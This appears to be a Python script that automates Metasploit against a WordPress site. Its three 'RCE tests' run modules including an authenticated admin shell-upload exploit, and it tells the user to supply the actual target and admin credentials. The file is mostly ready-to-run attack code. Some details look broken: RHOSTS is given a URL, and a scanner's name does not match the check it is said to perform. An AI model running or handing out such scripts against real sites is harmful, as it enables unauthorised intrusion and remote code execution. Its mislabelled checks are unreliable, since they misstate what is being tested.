import subprocess
import time

def run_metasploit_command(command):
    try:
        print(f"Executing Metasploit command:\n{command}")
        process = subprocess.Popen(['msfconsole', '-q', '-x', command],
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   universal_newlines=True)
        stdout, stderr = process.communicate(timeout=120)  # Increased timeout to 2 minutes
        return stdout, stderr
    except subprocess.TimeoutExpired:
        print("Command timed out after 2 minutes")
        return "", "Timeout"
    except Exception as e:
        print(f"An error occurred: {e}")
        return "", str(e)

def test_user_input_handling():
    print("\nTesting User Input Handling...")
    command = """
    use exploit/unix/webapp/wp_admin_shell_upload
    set RHOSTS target_wordpress_url
    set USERNAME admin
    set PASSWORD admin_password
    run
    exit
    """
    stdout, stderr = run_metasploit_command(command)
    print("Command output:")
    print(stdout)
    print("Error output:")
    print(stderr)
    if "Exploit completed" in stdout:
        print("Potential RCE vulnerability detected in User Input Handling")
    else:
        print("No RCE vulnerability detected in User Input Handling")

def test_theme_and_plugin():
    print("\nTesting Theme and Plugin...")
    command = """
    use exploit/unix/webapp/wp_custom_template_exploit
    set RHOSTS target_wordpress_url
    set TARGETURI /
    run
    exit
    """
    stdout, stderr = run_metasploit_command(command)
    print("Command output:")
    print(stdout)
    print("Error output:")
    print(stderr)
    if "Exploit completed" in stdout:
        print("Potential RCE vulnerability detected in Theme and Plugin")
    else:
        print("No RCE vulnerability detected in Theme and Plugin")

def test_direct_access_php():
    print("\nTesting Direct Access to PHP Files...")
    command = """
    use auxiliary/scanner/http/wordpress_ghost_scanner
    set RHOSTS target_wordpress_url
    run
    exit
    """
    stdout, stderr = run_metasploit_command(command)
    print("Command output:")
    print(stdout)
    print("Error output:")
    print(stderr)
    if "Vulnerable" in stdout:
        print("Potential RCE vulnerability detected in Direct Access to PHP Files")
    else:
        print("No RCE vulnerability detected in Direct Access to PHP Files")

if __name__ == "__main__":
    print("Starting WordPress RCE vulnerability tests...")
    print("Make sure Metasploit Framework is installed and accessible.")
    print("Ensure you have replaced 'target_wordpress_url', 'admin', and 'admin_password' with your actual target details.")

    input("Press Enter to start the tests...")

    test_user_input_handling()
    time.sleep(2)  # Add a delay between tests
    test_theme_and_plugin()
    time.sleep(2)
    test_direct_access_php()
    print("\nWordPress RCE vulnerability tests completed.")
